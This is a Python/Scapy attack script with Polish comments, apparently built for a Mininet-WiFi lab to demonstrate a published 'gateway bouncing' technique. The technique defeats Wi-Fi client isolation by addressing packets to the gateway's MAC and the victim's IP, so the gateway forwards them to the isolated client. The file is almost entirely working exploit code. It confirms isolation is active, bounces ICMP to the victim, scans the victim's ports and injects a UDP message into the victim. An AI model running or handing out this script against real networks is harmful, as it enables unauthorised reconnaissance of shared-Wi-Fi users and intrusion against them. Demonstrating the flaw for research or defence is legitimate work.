#!/usr/bin/env python3
"""
============================================================
AirSnitch - Atak Gateway Bouncing
Obejście izolacji klientów Wi-Fi (L2) przez routing L3
============================================================

Mechanizm:
    Atakujący wysyła pakiet z:
        - MAC dst = Brama sieciowa (dozwolone przez izolację)
        - IP  dst = Ofiara        (brama routuje do ofiary)

    Izolacja sprawdza tylko warstwę L2 (MAC), więc pakiet
    przechodzi do bramy, która przekazuje go ofierze (L3).

Uruchomienie z Mininet-WiFi CLI:
    atk1 python3 airsnitch_bounce.py

Wymagania: scapy (pip3 install scapy)
"""

from scapy.all import Ether, IP, ICMP, TCP, UDP, Raw, srp1, sendp, conf
import subprocess
import time
import sys

# ╔══════════════════════════════════════════════════════════╗
# ║                  KONFIGURACJA SIECI                      ║
# ╚══════════════════════════════════════════════════════════╝
GW_IP       = "192.168.10.1"
GW_MAC      = "00:00:00:00:00:FF"
VICTIM_IP   = "192.168.10.2"       # sta1
VICTIM_MAC  = "00:00:00:00:00:01"
ATK_IP      = "192.168.10.4"
ATK_MAC     = "00:00:00:00:00:66"


def get_wlan_interface():
    """Automatyczne wykrycie interfejsu WLAN stacji"""
    result = subprocess.run(
        ['ip', '-o', 'link', 'show'], capture_output=True, text=True
    )
    for line in result.stdout.strip().split('\n'):
        parts = line.split(':')
        if len(parts) >= 2:
            iface = parts[1].strip().split('@')[0]
            if 'wlan' in iface:
                return iface
    return 'atk1-wlan0'


IFACE = get_wlan_interface()
conf.verb = 0  # Wycisz domyślne komunikaty Scapy


def banner(text):
    print(f"\n{'=' * 60}")
    print(f"  {text}")
    print(f"{'=' * 60}")


# ╔══════════════════════════════════════════════════════════╗
# ║          FAZA 1: WERYFIKACJA IZOLACJI                    ║
# ╚══════════════════════════════════════════════════════════╝
banner("FAZA 1: Weryfikacja izolacji klientów")

print(f"[*] Interfejs: {IFACE}")
print(f"[*] Cel testu: Potwierdzenie, że izolacja blokuje ruch L2")
print(f"[*] Wysyłanie ICMP Echo bezpośrednio do ofiary {VICTIM_IP}...")

direct_pkt = (
    Ether(src=ATK_MAC, dst=VICTIM_MAC) /
    IP(src=ATK_IP, dst=VICTIM_IP) /
    ICMP(type=8, id=0x1234) /
    Raw(load=b"DIRECT_TEST")
)

ans = srp1(direct_pkt, iface=IFACE, timeout=3)
if ans:
    print(f"[!] UWAGA: Pakiet bezpośredni dotarł! Izolacja NIE działa!")
    print(f"[!] Sprawdź parametr client_isolation w topologii.")
else:
    print(f"[+] Brak odpowiedzi - izolacja klientów AKTYWNA ✓")

# Test łączności z bramą (powinien działać)
print(f"\n[*] Test łączności z bramą {GW_IP}...")
gw_pkt = (
    Ether(src=ATK_MAC, dst=GW_MAC) /
    IP(src=ATK_IP, dst=GW_IP) /
    ICMP(type=8, id=0x5678)
)
ans = srp1(gw_pkt, iface=IFACE, timeout=3)
if ans:
    print(f"[+] Brama osiągalna ✓ (odpowiedź od {ans[IP].src})")
else:
    print(f"[-] Brama nieosiągalna! Sprawdź topologię.")
    sys.exit(1)


# ╔══════════════════════════════════════════════════════════╗
# ║          FAZA 2: ATAK GATEWAY BOUNCING                   ║
# ╚══════════════════════════════════════════════════════════╝
banner("FAZA 2: Atak Gateway Bouncing (ICMP)")

print(f"[*] Strategia ataku:")
print(f"    ┌─────────────┐     ┌──────────┐     ┌──────────┐")
print(f"    │   atk1      │────>│  Brama   │────>│  sta1    │")
print(f"    │ (Atakujący) │     │ (Router) │     │ (Ofiara) │")
print(f"    └─────────────┘     └──────────┘     └──────────┘")
print(f"      MAC dst=GW         IP forward       Pakiet")
print(f"      IP dst=Ofiara      dst=Ofiara       dotarł!")
print()
print(f"[*] Preparowanie pakietu:")
print(f"    Ether: src={ATK_MAC} dst={GW_MAC}")
print(f"    IP:    src={ATK_IP}  dst={VICTIM_IP}")
print(f"    ICMP:  Echo Request")

bounce_pkt = (
    Ether(src=ATK_MAC, dst=GW_MAC) /
    IP(src=ATK_IP, dst=VICTIM_IP) /
    ICMP(type=8, id=0xAAAA, seq=1) /
    Raw(load=b"GATEWAY_BOUNCE_ATTACK")
)

print(f"\n[*] Wysyłanie pakietu Gateway Bounce...")
ans = srp1(bounce_pkt, iface=IFACE, timeout=3)

if ans:
    print(f"\n[+] ╔══════════════════════════════════════════╗")
    print(f"[+] ║   GATEWAY BOUNCING - SUKCES!             ║")
    print(f"[+] ║   Izolacja klientów OMINIĘTA!            ║")
    print(f"[+] ╚══════════════════════════════════════════╝")
    print(f"[+] Odpowiedź: {ans[IP].src} -> {ans[IP].dst}")
    print(f"[+] TTL: {ans[IP].ttl}, Type: {ans[ICMP].type}")
else:
    print(f"[-] Brak odpowiedzi. Sprawdź ip_forward na bramie.")
    print(f"[-] Komenda: gw sysctl -w net.ipv4.ip_forward=1")


# ╔══════════════════════════════════════════════════════════╗
# ║    FAZA 3: SERIA PAKIETÓW (dowód powtarzalności)         ║
# ╚══════════════════════════════════════════════════════════╝
banner("FAZA 3: Seria 5 pakietów ICMP via Gateway Bounce")

success = 0
for i in range(5):
    pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=ATK_IP, dst=VICTIM_IP, ttl=64) /
        ICMP(type=8, id=0xBBBB, seq=i + 1) /
        Raw(load=f"BOUNCE_SEQ_{i + 1}".encode())
    )

    ans = srp1(pkt, iface=IFACE, timeout=2)
    if ans:
        rtt = (ans.time - pkt.time) * 1000
        print(f"  [+] Pakiet {i + 1}/5: Odpowiedź w {rtt:.1f} ms "
              f"od {ans[IP].src} (TTL={ans[IP].ttl})")
        success += 1
    else:
        print(f"  [-] Pakiet {i + 1}/5: Brak odpowiedzi")
    time.sleep(0.3)

print(f"\n[*] Wynik: {success}/5 pakietów ominęło izolację")


# ╔══════════════════════════════════════════════════════════╗
# ║    FAZA 4: SKANOWANIE PORTÓW via Gateway Bounce          ║
# ╚══════════════════════════════════════════════════════════╝
banner("FAZA 4: Skanowanie portów ofiary via Gateway Bounce")

ports_to_scan = [22, 80, 443, 8080]
open_ports = []

for port in ports_to_scan:
    tcp_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        IP(src=ATK_IP, dst=VICTIM_IP) /
        TCP(sport=40000 + port, dport=port, flags='S')
    )

    ans = srp1(tcp_pkt, iface=IFACE, timeout=2)
    if ans and TCP in ans:
        if ans[TCP].flags == 0x12:  # SYN-ACK
            status = "OTWARTY ✓"
            open_ports.append(port)
        elif ans[TCP].flags == 0x14:  # RST-ACK
            status = "zamknięty"
        else:
            status = f"flagi={ans[TCP].flags:#x}"
        print(f"  Port {port:5d}: {status}")
    else:
        print(f"  Port {port:5d}: filtrowany/brak odpowiedzi")

if open_ports:
    print(f"\n[+] Otwarte porty ofiary (wykryte mimo izolacji): {open_ports}")


# ╔══════════════════════════════════════════════════════════╗
# ║    FAZA 5: WSTRZYKNIĘCIE UDP via Gateway Bounce          ║
# ╚══════════════════════════════════════════════════════════╝
banner("FAZA 5: Wstrzyknięcie danych UDP do ofiary")

udp_pkt = (
    Ether(src=ATK_MAC, dst=GW_MAC) /
    IP(src=ATK_IP, dst=VICTIM_IP) /
    UDP(sport=12345, dport=9999) /
    Raw(load=b"AirSnitch: Twoja siec zostala skompromitowana!")
)

print(f"[*] Wysyłanie pakietu UDP (port 9999) do {VICTIM_IP} via Gateway Bounce...")
sendp(udp_pkt, iface=IFACE)
print(f"[+] Pakiet UDP wysłany (weryfikuj tcpdump/Wireshark na sta1)")


# ╔══════════════════════════════════════════════════════════╗
# ║                    PODSUMOWANIE                          ║
# ╚══════════════════════════════════════════════════════════╝
banner("PODSUMOWANIE ATAKU GATEWAY BOUNCING")
print(f"""
Atak Gateway Bouncing pozwolił na:
  1. Wysłanie pakietów ICMP do izolowanej ofiary ({success}/5 sukcesów)
  2. Skanowanie portów ofiary mimo Client Isolation
  3. Wstrzyknięcie danych UDP do ofiary
  4. Pełne ominięcie zabezpieczenia Client Isolation na L2

Mechanizm podatności:
  - Izolacja klientów działa TYLKO na warstwie L2 (adres MAC)
  - Brama sieciowa akceptuje pakiety (bo MAC dst = brama)
  - Brama routuje pakiet na podstawie IP dst (warstwa L3)
  - AP przepuszcza odpowiedź od bramy do ofiary (legalny ruch)

Root Cause (wg AirSnitch / NDSS 2026):
  Producenci sprzętu implementują izolację tylko w warstwie
  przełączania (L2), ignorując warstwę rutingu (L3).
""")
